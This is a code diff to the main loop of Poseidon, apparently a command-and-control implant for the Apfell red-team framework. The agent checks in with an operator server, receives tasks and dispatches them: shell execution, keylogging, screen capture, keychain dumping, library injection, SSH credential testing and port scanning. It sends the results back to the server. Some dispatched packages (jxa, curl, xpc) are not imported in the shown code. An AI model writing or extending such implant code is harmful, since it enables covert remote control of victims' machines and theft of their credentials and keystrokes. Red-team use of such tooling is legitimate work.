@@ -4,43 +4,40 @@ import (
 	"C"
 	"encoding/json"
 	"fmt"
+	"log"
 	"os"
 	"os/user"
-	"strconv"
 	"strings"
+	"sync"
 	"time"
-	"log"
 
 	"github.com/xorrior/poseidon/pkg/commands/cat"
-	"github.com/xorrior/poseidon/pkg/commands/executeassembly"
-	"github.com/xorrior/poseidon/pkg/commands/getprivs"
-	"github.com/xorrior/poseidon/pkg/commands/keys"
-	"github.com/xorrior/poseidon/pkg/commands/libinject"
-	"github.com/xorrior/poseidon/pkg/commands/ls"
-	"github.com/xorrior/poseidon/pkg/commands/portscan"
-	"github.com/xorrior/poseidon/pkg/commands/ps"
-	"github.com/xorrior/poseidon/pkg/commands/screencapture"
-	"github.com/xorrior/poseidon/pkg/commands/shell"
-	"github.com/xorrior/poseidon/pkg/commands/shinject"
-	"github.com/xorrior/poseidon/pkg/commands/sshauth"
-	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/commands/cp"
 	"github.com/xorrior/poseidon/pkg/commands/drives"
 	"github.com/xorrior/poseidon/pkg/commands/getenv"
 	"github.com/xorrior/poseidon/pkg/commands/getuser"
 	"github.com/xorrior/poseidon/pkg/commands/keylog"
+	"github.com/xorrior/poseidon/pkg/commands/keys"
 	"github.com/xorrior/poseidon/pkg/commands/kill"
+	"github.com/xorrior/poseidon/pkg/commands/libinject"
+	"github.com/xorrior/poseidon/pkg/commands/ls"
 	"github.com/xorrior/poseidon/pkg/commands/mkdir"
 	"github.com/xorrior/poseidon/pkg/commands/mv"
+	"github.com/xorrior/poseidon/pkg/commands/portscan"
+	"github.com/xorrior/poseidon/pkg/commands/ps"
 	"github.com/xorrior/poseidon/pkg/commands/pwd"
 	"github.com/xorrior/poseidon/pkg/commands/rm"
+	"github.com/xorrior/poseidon/pkg/commands/screencapture"
 	"github.com/xorrior/poseidon/pkg/commands/setenv"
+	"github.com/xorrior/poseidon/pkg/commands/shell"
+	"github.com/xorrior/poseidon/pkg/commands/sshauth"
+	"github.com/xorrior/poseidon/pkg/commands/triagedirectory"
 	"github.com/xorrior/poseidon/pkg/commands/unsetenv"
 	"github.com/xorrior/poseidon/pkg/profiles"
 	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
-	
 )
+import "sort"
 
 const (
 	NONE_CODE = 100
@@ -52,91 +49,128 @@ var (
 	taskSlice       []structs.Task
 )
 
+var mu sync.Mutex
+
 //export RunMain
 func RunMain() {
 	main()
 }
 
+// Handle File upload responses from apfell
+func handleFileUploadResponse(resp []byte, backgroundTasks map[string](chan []byte)) {
+	var taskResp map[string]interface{}
+	err := json.Unmarshal(resp, &taskResp)
+	if err != nil {
+		//log.Printf("Error unmarshal response to task response: %s", err.Error())
+	}
+
+	if fileid, ok := taskResp["file_id"]; ok {
+		if v, exists := backgroundTasks[fileid.(string)]; exists {
+			// send data to the channel
+			raw, _ := json.Marshal(taskResp)
+			go func() {
+				v <- raw
+			}()
+		}
+	}
+}
+
+// Handle Screenshot data
+func handleScreenshot(profile profiles.Profile, task structs.Task, backgroundchannel chan []byte, dataChannel chan []screencapture.ScreenShot) {
+	results := <-dataChannel
+	for i := 0; i < len(results); i++ {
+		profile.SendFileChunks(task, results[i].Data(), backgroundchannel)
+	}
+}
+
+// Handle TaskResponses from apfell
+func handleResponses(resp []byte, backgroundTasks map[string](chan []byte)) {
+	// Handle the response from apfell
+	taskResp := structs.TaskResponseMessageResponse{}
+	err := json.Unmarshal(resp, &taskResp)
+	if err != nil {
+		log.Printf("Error unmarshal response to task response: %s", err.Error())
+	}
+
+	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
+	for i := 0; i < len(taskResp.Responses); i++ {
+		var r map[string]interface{}
+		err := json.Unmarshal([]byte(taskResp.Responses[i]), &r)
+		if err != nil {
+			log.Printf("Error unmarshal response to task response: %s", err.Error())
+			break
+		}
+
+		if taskid, ok := r["task_id"]; ok {
+			if v, exists := backgroundTasks[taskid.(string)]; exists {
+				// send data to the channel
+
+				//log.Printf("Found background task with %s as the key. Responses index: %d", taskid.(string), i)
+				raw, _ := json.Marshal(r)
+				go func() {
+					v <- raw
+				}()
+				continue
+			}
+		}
+	}
+}
+
 func main() {
 
 	// Initialize the  agent and check in
-
 	currentUser, _ := user.Current()
 	hostname, _ := os.Hostname()
 	currIP := functions.GetCurrentIPAddress()
 	currPid := os.Getpid()
+
 	p := profiles.NewInstance()
 	profile := p.(profiles.Profile)
-	profile.SetUniqueID(profiles.UUID)
-	profile.SetURL(profiles.BaseURL)
-	profile.SetURLs(profiles.BaseURLs)
-	profile.SetSleepInterval(profiles.Sleep)
-	profile.SetUserAgent(profiles.UserAgent)
-	// Evaluate static variables
-	if strings.Contains(profiles.ExchangeKeyString, "T") {
-		//log.Println("Xchange keys true")
-		profile.SetXKeys(true)
-	} else {
-		//log.Println("Xchange keys false")
-		profile.SetXKeys(false)
-	}
-
-	if !strings.Contains(profiles.AesPSK, "AESPSK") && len(profiles.AesPSK) > 0 {
-		//log.Println("Aes pre shared key is set")
-		profile.SetAesPreSharedKey(profiles.AesPSK)
-	} else {
-		//log.Println("Aes pre shared key is not set")
-		profile.SetAesPreSharedKey("")
-	}
-
-	if len(profiles.HostHeader) > 0 {
-		profile.SetHeader(profiles.HostHeader)
-	}
-
 	// Checkin with Apfell. If encryption is enabled, the keyx will occur during this process
 	// fmt.Println(currentUser.Name)
 	resp := profile.CheckIn(currIP, currPid, currentUser.Username, hostname)
-	checkIn := resp.(structs.CheckinResponse)
-	//log.Printf("Received checkin response: %+v\n", checkIn)
+	checkIn := resp.(structs.CheckInMessageResponse)
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":             EXIT_CODE,
-		"shell":            1,
-		"screencapture":    2,
-		"keylog":           3,
-		"download":         4,
-		"upload":           5,
-		"inject":           6,
-		"shinject":         7,
-		"ps":               8,
-		"sleep":            9,
-		"cat":              10,
-		"cd":               11,
-		"ls":               12,
-		"python":           13,
-		"jxa":              14,
-		"keys":             15,
-		"triagedirectory":  16,
-		"sshauth":          17,
-		"portscan":         18,
-		"getprivs":         19,
-		"execute-assembly": 20,
-		"jobs":             21,
-		"jobkill":          22,
-		"cp":               23,
-		"drives":           24,
-		"getuser":          25,
-		"mkdir":            26,
-		"mv":               27,
-		"pwd":              28,
-		"rm":               29,
-		"getenv":           30,
-		"setenv":           31,
-		"unsetenv":         32,
-		"kill":             33,
-		"none":             NONE_CODE,
+		"exit":            EXIT_CODE,
+		"shell":           1,
+		"screencapture":   2,
+		"keylog":          3,
+		"download":        4,
+		"upload":          5,
+		"libinject":       6,
+		"ps":              8,
+		"sleep":           9,
+		"cat":             10,
+		"cd":              11,
+		"ls":              12,
+		"python":          13,
+		"jxa":             14,
+		"keys":            15,
+		"triagedirectory": 16,
+		"sshauth":         17,
+		"portscan":        18,
+		"jobs":            21,
+		"jobkill":         22,
+		"cp":              23,
+		"drives":          24,
+		"getuser":         25,
+		"mkdir":           26,
+		"mv":              27,
+		"pwd":             28,
+		"rm":              29,
+		"getenv":          30,
+		"setenv":          31,
+		"unsetenv":        32,
+		"kill":            33,
+		"curl":            34,
+		"xpc":             35,
+		"none":            NONE_CODE,
 	}
+
+	// Map used to handle go routines that are waiting for a response from apfell to continue
+	backgroundTasks := make(map[string](chan []byte))
 
 	// Channel used to catch results from tasking threads
 	res := make(chan structs.ThreadMsg)
@@ -148,7 +182,7 @@ func main() {
 
 			// Get the next task
 			t := profile.GetTasking()
-			task := t.(structs.Task)
+			task := t.(structs.TaskRequestMessageResponse)
 			/*
 				Unfortunately, due to the architecture of goroutines, there is no easy way to kill threads.
 				This check is to make sure we're running a "killable" process, and if so, add it to the queue.
@@ -157,295 +191,422 @@ func main() {
 					- triagedirectory
 					- portscan
 			*/
-			if tasktypes[task.Command] == 3 || tasktypes[task.Command] == 16 || tasktypes[task.Command] == 18 || tasktypes[task.Command] == 20 {
-				// log.Println("Making a job for", task.Command)
-				job := &structs.Job{
-					KillChannel: make(chan int),
-					Stop:        new(int),
-					Monitoring:  false,
-				}
-				task.Job = job
-				taskSlice = append(taskSlice, task)
-			}
-			switch tasktypes[task.Command] {
-			case EXIT_CODE:
-				// Throw away the response, we don't really need it for anything
-				profile.PostResponse(task, "Exiting")
-				break LOOP
-			case 1:
-				// Run shell command
-				go shell.Run(task, res)
-				break
-			case 2:
-				// Capture screenshot
-				go screencapture.Run(task, res)
-				break
-			case 3:
-				go keylog.Run(task, res)
-				break
-			case 4:
-				//File download
-				profile.SendFile(task, task.Params)
-				break
-			case 5:
-				// File upload
-				fileDetails := structs.FileUploadParams{}
-				err := json.Unmarshal([]byte(task.Params), &fileDetails)
-				if err != nil {
-					profile.PostResponse(task, err.Error())
-					break
-				}
 
-				data := profile.GetFile(fileDetails.FileID)
-				if len(data) > 0 {
-					f, e := os.Create(fileDetails.RemotePath)
+			// sort the Tasks
+			sort.Slice(task.Tasks, func(i, j int) bool {
+				return task.Tasks[i].Timestamp < task.Tasks[j].Timestamp
+			})
 
-					if e != nil {
-						profile.PostResponse(task, e.Error())
+			for j := 0; j < len(task.Tasks); j++ {
+				if tasktypes[task.Tasks[j].Command] == 3 || tasktypes[task.Tasks[j].Command] == 16 || tasktypes[task.Tasks[j].Command] == 18 || tasktypes[task.Tasks[j].Command] == 20 {
+					// log.Println("Making a job for", task.Command)
+					job := &structs.Job{
+						KillChannel: make(chan int),
+						Stop:        new(int),
+						Monitoring:  false,
 					}
-
-					n, failed := f.Write(data)
-
-					if failed != nil && n == 0 {
-						profile.PostResponse(task, failed.Error())
-					}
-
-					profile.PostResponse(task, "File upload successful")
+					task.Tasks[j].Job = job
+					taskSlice = append(taskSlice, task.Tasks[j])
 				}
-
-				break
-
-			case 6:
-				go libinject.Run(task, res)
-				break
-
-			case 7:
-				tMsg := &structs.ThreadMsg{}
-				tMsg.TaskItem = task
-				args := &shinject.Arguments{}
-				//log.Println("Windows Inject:\n", string(task.Params))
-				err := json.Unmarshal([]byte(task.Params), &args)
-
-				if err != nil {
-					tMsg.Error = true
-					tMsg.TaskResult = []byte(err.Error())
-					res <- *tMsg
-					break
-				}
-				args.ShellcodeData = profile.GetFile(args.ShellcodeFile)
-
-				//log.Println("Length of shellcode:", len(args.ShellcodeData))
-				if len(args.ShellcodeData) == 0 {
-					tMsg.Error = true
-					tMsg.TaskResult = []byte(fmt.Sprintf("File ID %s content was empty.", args.ShellcodeFile))
-					res <- *tMsg
-					break
-				}
-				go shinject.Run(args, tMsg, res)
-				break
-			case 8:
-				go ps.Run(task, res)
-				break
-			case 9:
-				// Sleep
-				i, err := strconv.Atoi(task.Params)
-				if err != nil {
-					profile.PostResponse(task, err.Error())
-					break
-				}
-
-				profile.SetSleepInterval(i)
-				profile.PostResponse(task, "Sleep Updated..")
-				break
-			case 10:
-				//Cat a file
-				go cat.Run(task, res)
-				break
-			case 11:
-				//Change cwd
-				err := os.Chdir(task.Params)
-				if err != nil {
-					profile.PostResponse(task, err.Error())
-					break
-				}
-
-				profile.PostResponse(task, fmt.Sprintf("changed directory to: %s", task.Params))
-				break
-			case 12:
-				//List directory contents
-				go ls.Run(task, res)
-				break
-
-			case 15:
-				// Enumerate keyring data for linux or the keychain for macos
-				go keys.Run(task, res)
-				break
-			case 16:
-				// Triage a directory and organize files by type
-				go triagedirectory.Run(task, res)
-				break
-			case 17:
-				// Test credentials against remote hosts
-				go sshauth.Run(task, res)
-				break
-			case 18:
-				// Scan ports on remote hosts.
-				go portscan.Run(task, res)
-				break
-			case 19:
-				// Enable privileges for your current process.
-				go getprivs.Run(task, res)
-				break
-			case 20:
-				// Execute a .NET assembly
-				tMsg := &structs.ThreadMsg{}
-				tMsg.TaskItem = task
-				args := &executeassembly.Arguments{}
-				// log.Println("Windows Inject:\n", string(task.Params))
-				err := json.Unmarshal([]byte(task.Params), &args)
-
-				if err != nil {
-					tMsg.Error = true
-					tMsg.TaskResult = []byte(err.Error())
-					res <- *tMsg
-					break
-				}
-
-				if assemblyFetched == 0 {
-					if args.LoaderFileID == "" {
-						tMsg.Error = true
-						tMsg.TaskResult = []byte("Have not fetched the .NET assembly yet. Please upload to the server and specify the file ID.")
-						res <- *tMsg
-						break
-					}
-					//log.Println("Fetching loader file...")
-					args.LoaderBytes = profile.GetFile(args.LoaderFileID)
-					if len(args.LoaderBytes) == 0 {
-						tMsg.Error = true
-						tMsg.TaskResult = []byte(fmt.Sprintf("Invalid .NET Loader DLL retrieved. Length of DLL retrieved: %d", len(args.LoaderBytes)))
-						res <- *tMsg
-						break
-					}
-					//log.Println("Done")
-					assemblyFetched += 1 // Increment the counter so we know not to fetch it again.
-				}
-				//log.Println("Fetching assembly bytes...")
-				args.AssemblyBytes = profile.GetFile(args.AssemblyFileID)
-				//log.Println("Done")
-				go executeassembly.Run(args, tMsg, res)
-				break
-			case 21:
-				// Return the list of jobs.
-				tMsg := structs.ThreadMsg{}
-				tMsg.TaskItem = task
-				tMsg.Error = false
-				log.Println("Number of tasks processing:", len(taskSlice))
-				fmt.Println(taskSlice)
-				// For graceful error handling server-side when zero jobs are processing.
-				if len(taskSlice) == 0 {
-					tMsg.TaskResult = []byte("[]")
-				} else {
-					var jobList []structs.TaskStub
-					for _, x := range taskSlice {
-						jobList = append(jobList, x.ToStub())
-					}
-					jsonSlices, err := json.Marshal(jobList)
-					log.Println("Finished marshalling tasks into:", string(jsonSlices))
+				switch tasktypes[task.Tasks[j].Command] {
+				case EXIT_CODE:
+					// Throw away the response, we don't really need it for anything
+					resp := structs.Response{}
+					resp.UserOutput = "exiting"
+					resp.Completed = true
+					resp.TaskID = task.Tasks[j].TaskID
+					encResp, err := json.Marshal(resp)
 					if err != nil {
-						log.Println("Failed to marshal :'(")
-						log.Println(err.Error())
-						tMsg.Error = true
-						tMsg.TaskResult = []byte(err.Error())
-						go func() {
-							res <- tMsg
-						}()
+						//log.Println("Error marshaling exit response: ", err.Error())
 						break
 					}
-					tMsg.TaskResult = jsonSlices
-				}
-				go func() {
-					res <- tMsg
-				}()
-				log.Println("returned!")
-				break
-			case 22:
-				// Kill the job
-				tMsg := structs.ThreadMsg{}
-				tMsg.Error = false
-				tMsg.TaskItem = task
 
-				foundTask := false
-				for _, taskItem := range taskSlice {
-					if taskItem.ID == task.Params {
-						go taskItem.Job.SendKill()
-						foundTask = true
+					mu.Lock()
+					profiles.TaskResponses = append(profiles.TaskResponses, encResp)
+					mu.Unlock()
+
+					break LOOP
+				case 1:
+					// Run shell command
+					go shell.Run(task.Tasks[j])
+					break
+				case 2:
+					// Capture screenshot
+					backgroundTasks[task.Tasks[j].TaskID] = make(chan []byte)
+					dataChan := make(chan []screencapture.ScreenShot)
+					go screencapture.Run(task.Tasks[j], dataChan)
+					go handleScreenshot(profile, task.Tasks[j], backgroundTasks[task.Tasks[j].TaskID], dataChan)
+
+					break
+				case 3:
+					go keylog.Run(task.Tasks[j])
+					break
+				case 4:
+					//File download
+					backgroundTasks[task.Tasks[j].TaskID] = make(chan []byte)
+					go profile.SendFile(task.Tasks[j], task.Tasks[j].Params, backgroundTasks[task.Tasks[j].TaskID])
+					break
+				case 5:
+					// File upload
+					fileDetails := structs.FileUploadParams{}
+
+					err := json.Unmarshal([]byte(task.Tasks[j].Params), &fileDetails)
+					if err != nil {
+						//log.Println("Error in unmarshal: ", err.Error())
+						errResp := structs.Response{}
+						errResp.Completed = false
+						errResp.TaskID = task.Tasks[j].TaskID
+						errResp.Status = "error"
+						errResp.UserOutput = err.Error()
+
+						encErrResp, _ := json.Marshal(errResp)
+						mu.Lock()
+						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
+						mu.Unlock()
+
+						break
 					}
-				}
 
-				if foundTask {
-					tMsg.TaskResult = []byte(fmt.Sprintf("Sent kill signal to Job ID: %s", task.Params))
-				} else {
-					tMsg.TaskResult = []byte(fmt.Sprintf("No job with ID: %s", task.Params))
-					tMsg.Error = true
+					backgroundTasks[fileDetails.FileID] = make(chan []byte)
+					//log.Println("Added to backgroundTasks with file id: ", fileDetails.FileID)
+					go profile.GetFile(task.Tasks[j], fileDetails, backgroundTasks[fileDetails.FileID])
+					break
+
+				case 6:
+					go libinject.Run(task.Tasks[j])
+					break
+				case 8:
+					go ps.Run(task.Tasks[j])
+					break
+				case 9:
+					// Sleep
+					type Args struct {
+						Sleep  int `json:"sleep"`
+						Jitter int `json:"jitter"`
+					}
+
+					args := Args{}
+					err := json.Unmarshal([]byte(task.Tasks[j].Params), &args)
+
+					if err != nil {
+						errResp := structs.Response{}
+						errResp.Completed = false
+						errResp.TaskID = task.Tasks[j].TaskID
+						errResp.Status = "error"
+						errResp.UserOutput = err.Error()
+
+						encErrResp, _ := json.Marshal(errResp)
+						mu.Lock()
+						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
+						mu.Unlock()
+						break
+					}
+
+					profile.SetSleepInterval(args.Sleep)
+					profile.SetSleepJitter(args.Jitter)
+					resp := structs.Response{}
+					resp.UserOutput = "sleep updated"
+					resp.Completed = true
+					resp.TaskID = task.Tasks[j].TaskID
+					encResp, err := json.Marshal(resp)
+					if err != nil {
+						errResp := structs.Response{}
+						errResp.Completed = false
+						errResp.TaskID = task.Tasks[j].TaskID
+						errResp.Status = "error"
+						errResp.UserOutput = err.Error()
+
+						encErrResp, _ := json.Marshal(errResp)
+						mu.Lock()
+						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
+						mu.Unlock()
+						break
+					}
+					mu.Lock()
+					profiles.TaskResponses = append(profiles.TaskResponses, encResp)
+					mu.Unlock()
+
+					break
+				case 10:
+					//Cat a file
+					go cat.Run(task.Tasks[j])
+					break
+				case 11:
+					//Change cwd
+					err := os.Chdir(task.Tasks[j].Params)
+					msg := structs.Response{}
+					msg.TaskID = task.Tasks[j].TaskID
+					if err != nil {
+						errResp := structs.Response{}
+						errResp.Completed = false
+						errResp.TaskID = task.Tasks[j].TaskID
+						errResp.Status = "error"
+						errResp.UserOutput = err.Error()
+
+						encErrResp, _ := json.Marshal(errResp)
+						mu.Lock()
+						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
+						mu.Unlock()
+						break
+					}
+
+					msg.UserOutput = fmt.Sprintf("changed directory to: %s", task.Tasks[j].Params)
+					msg.Completed = true
+					encResp, err := json.Marshal(msg)
+					if err != nil {
+						errResp := structs.Response{}
+						errResp.Completed = false
+						errResp.TaskID = task.Tasks[j].TaskID
+						errResp.Status = "error"
+						errResp.UserOutput = err.Error()
+
+						encErrResp, _ := json.Marshal(errResp)
+						mu.Lock()
+						profiles.TaskResponses = append(profiles.TaskResponses, encErrResp)
+						mu.Unlock()
+						break
+					}
+					mu.Lock()
+					profiles.TaskResponses = append(profiles.TaskResponses, encResp)
+					mu.Unlock()
+
+					break
+				case 12:
+					//List directory contents
+					go ls.Run(task.Tasks[j])
+					break
+				case 14:
+					//Execute jxa code in memory
+					go jxa.Run(task.Tasks[j])
+					break
+				case 15:
+					// Enumerate keyring data for linux or the keychain for macos
+					go keys.Run(task.Tasks[j])
+					break
+				case 16:
+					// Triage a directory and organize files by type
+					go triagedirectory.Run(task.Tasks[j])
+					break
+				case 17:
+					// Test credentials against remote hosts
+					go sshauth.Run(task.Tasks[j])
+					break
+				case 18:
+					// Scan ports on remote hosts.
+					go portscan.Run(task.Tasks[j])
+					break
+				case 21:
+					// Return the list of jobs.
+
+					msg := structs.Response{}
+					msg.TaskID = task.Tasks[j].TaskID
+					//log.Println("Number of tasks processing:", len(taskSlice))
+					//fmt.Println(taskSlice)
+					// For graceful error handling server-side when zero jobs are processing.
+					if len(taskSlice) == 0 {
+						msg.Completed = true
+						msg.UserOutput = "0 jobs"
+					} else {
+						var jobList []structs.TaskStub
+						for _, x := range taskSlice {
+							jobList = append(jobList, x.ToStub())
+						}
+						jsonSlices, err := json.MarshalIndent(jobList, "", "	")
+						//log.Println("Finished marshalling tasks into:", string(jsonSlices))
+						if err != nil {
+							//log.Println("Failed to marshal :'(")
+							//log.Println(err.Error())
+							msg.UserOutput = err.Error()
+							msg.Completed = true
+							msg.Status = "error"
+
+						} else {
+							msg.UserOutput = string(jsonSlices)
+							msg.Completed = true
+						}
+
+					}
+					rawmsg, _ := json.Marshal(msg)
+					mu.Lock()
+					profiles.TaskResponses = append(profiles.TaskResponses, rawmsg)
+					mu.Unlock()
+
+					//log.Println("returned!")
+					break
+				case 22:
+					// Kill the job
+					msg := structs.Response{}
+					msg.TaskID = task.Tasks[j].TaskID
+
+					foundTask := false
+					for _, taskItem := range taskSlice {
+						if taskItem.TaskID == task.Tasks[j].TaskID {
+							go taskItem.Job.SendKill()
+							foundTask = true
+						}
+					}
+
+					if foundTask {
+						msg.UserOutput = fmt.Sprintf("Sent kill signal to Job ID: %s", task.Tasks[j].Params)
+						msg.Completed = true
+					} else {
+						msg.UserOutput = fmt.Sprintf("No job with ID: %s", task.Tasks[j].Params)
+						msg.Completed = true
+					}
+
+					rawmsg, _ := json.Marshal(msg)
+					mu.Lock()
+					profiles.TaskResponses = append(profiles.TaskResponses, rawmsg)
+					mu.Unlock()
+					break
+				case 23:
+					// copy a file!
+					go cp.Run(task.Tasks[j])
+					break
+				case 24:
+					// List drives on a machine
+					go drives.Run(task.Tasks[j])
+					break
+				case 25:
+					// Retrieve information about the current user.
+					go getuser.Run(task.Tasks[j])
+					break
+				case 26:
+					// Make a directory
+					go mkdir.Run(task.Tasks[j])
+					break
+				case 27:
+					// Move files
+					go mv.Run(task.Tasks[j])
+					break
+				case 28:
+					// Print working directory
+					go pwd.Run(task.Tasks[j])
+					break
+				case 29:
+					go rm.Run(task.Tasks[j])
+					break
+				case 30:
+					go getenv.Run(task.Tasks[j])
+					break
+				case 31:
+					go setenv.Run(task.Tasks[j])
+					break
+				case 32:
+					go unsetenv.Run(task.Tasks[j])
+					break
+				case 33:
+					go kill.Run(task.Tasks[j])
+					break
+				case 34:
+					go curl.Run(task.Tasks[j])
+					break
+				case 35:
+					go xpc.Run(task.Tasks[j])
+					break
+				case NONE_CODE:
+					// No tasks, do nothing
+					break
 				}
-				go func(threadChan *chan structs.ThreadMsg, msg *structs.ThreadMsg) {
-					*threadChan <- *msg
-				}(&res, &tMsg)
-				break
-			case 23:
-				// copy a file!
-				go cp.Run(task, res)
-			case 24:
-				// List drives on a machine
-				go drives.Run(task, res)
-			case 25:
-				// Retrieve information about the current user.
-				go getuser.Run(task, res)
-			case 26:
-				// Make a directory
-				go mkdir.Run(task, res)
-			case 27:
-				// Move files
-				go mv.Run(task, res)
-			case 28:
-				// Print working directory
-				go pwd.Run(task, res)
-			case 29:
-				go rm.Run(task, res)
-			case 30:
-				go getenv.Run(task, res)
-			case 31:
-				go setenv.Run(task, res)
-			case 32:
-				go unsetenv.Run(task, res)
-			case 33:
-				go kill.Run(task, res)
-			case NONE_CODE:
-				// No tasks, do nothing
-				break
 			}
 
-			// Listen on the results channel for 1 second
-			select {
-			case toApfell := <-res:
-				for i := 0; i < len(taskSlice); i++ {
-					if taskSlice[i].ID == toApfell.TaskItem.ID && !taskSlice[i].Job.Monitoring {
-						if i != (len(taskSlice) - 1) {
-							taskSlice = append(taskSlice[:i], taskSlice[i+1:]...)
+			// loop through all task responses
+			if len(profiles.TaskResponses) > 0 {
+				responseMsg := structs.TaskResponseMessage{}
+				responseMsg.Action = "post_response"
+				responseMsg.Responses = make([]json.RawMessage, 0)
+				responseMsg.Delegates = make([]json.RawMessage, 0)
+				size := 512000 // Set the chunksize
+				// Chunk the response
+				for j := 0; j < len(profiles.TaskResponses); j++ {
+					// loop through the background tasks
+
+					if len(profiles.TaskResponses[j]) < size {
+						responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
+					} else if len(responseMsg.Responses) < 1 && len(profiles.TaskResponses[j]) > size { // If the response is bigger than chunk size and there aren't any responses in responseMsg.Responses
+						responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
+						if j < len(profiles.TaskResponses)-1 {
+							profiles.TaskResponses = profiles.TaskResponses[j+1:]
 						} else {
-							taskSlice = taskSlice[:i]
+							profiles.TaskResponses = make([]json.RawMessage, 0)
 						}
 						break
+					} else if len(responseMsg.Responses) > 0 && len(profiles.TaskResponses[j]) > size {
+						profiles.TaskResponses = profiles.TaskResponses[j:]
+						break
 					}
+
+					if len(responseMsg.Responses) == len(profiles.TaskResponses) {
+						profiles.TaskResponses = make([]json.RawMessage, 0)
+						break
+					}
+					size = size - len(profiles.TaskResponses[j])
 				}
-				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
-					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
+
+				//log.Printf("Response to apfell: %+v\n", responseMsg)
+				encResponse, _ := json.Marshal(responseMsg)
+				// Post all responses to apfell
+				resp := profile.PostResponse(encResponse, true)
+				if len(resp) > 0 {
+					//log.Printf("Raw resp: \n %s", string(resp))
+					go handleResponses(resp, backgroundTasks)
+				}
+
+			}
+
+			// Iterate over file uploads
+			if len(profiles.UploadResponses) > 0 {
+				var uploadMsg json.RawMessage
+				if len(profiles.UploadResponses) > 1 {
+					// Pop from the front if there is more than one
+					uploadMsg, profiles.UploadResponses = profiles.UploadResponses[0], profiles.UploadResponses[1:]
 				} else {
-					profile.PostResponse(toApfell.TaskItem, string(toApfell.TaskResult))
+					uploadMsg = profiles.UploadResponses[0]
+					profiles.UploadResponses = make([]json.RawMessage, 0)
 				}
-			case <-time.After(1 * time.Second):
-				break
+
+				//encResponse, _ := json.Marshal(uploadMsg)
+				// Post all responses to apfell
+				resp := profile.PostResponse([]byte(uploadMsg), true)
+				if len(resp) > 0 {
+					go handleFileUploadResponse(resp, backgroundTasks)
+				}
+
 			}
 		}
+
+		// loop through all task responses before exiting
+		responseMsg := structs.TaskResponseMessage{}
+		responseMsg.Action = "post_response"
+		responseMsg.Responses = make([]json.RawMessage, 0)
+		responseMsg.Delegates = make([]json.RawMessage, 0)
+		size := 512000 // Set the chunksize
+		// Chunk the response
+		for j := 0; j < len(profiles.TaskResponses); j++ {
+			if len(profiles.TaskResponses[j]) < size {
+				responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
+			} else if len(responseMsg.Responses) < 1 && len(profiles.TaskResponses[j]) > size { // If the response is bigger than chunk size and there aren't any responses in responseMsg.Responses
+				responseMsg.Responses = append(responseMsg.Responses, profiles.TaskResponses[j])
+				if j < len(profiles.TaskResponses)-1 {
+					profiles.TaskResponses = profiles.TaskResponses[j+1:]
+				} else {
+					profiles.TaskResponses = make([]json.RawMessage, 0)
+				}
+				break
+			} else if len(responseMsg.Responses) > 0 && len(profiles.TaskResponses[j]) > size {
+				profiles.TaskResponses = profiles.TaskResponses[j:]
+				break
+			}
+
+			if len(responseMsg.Responses) == len(profiles.TaskResponses) {
+				profiles.TaskResponses = make([]json.RawMessage, 0)
+				break
+			}
+			size = size - len(profiles.TaskResponses[j])
+		}
+
+		encResponse, _ := json.Marshal(responseMsg)
+		// Post all responses to apfell
+		_ = profile.PostResponse(encResponse, true)
 	}
 }
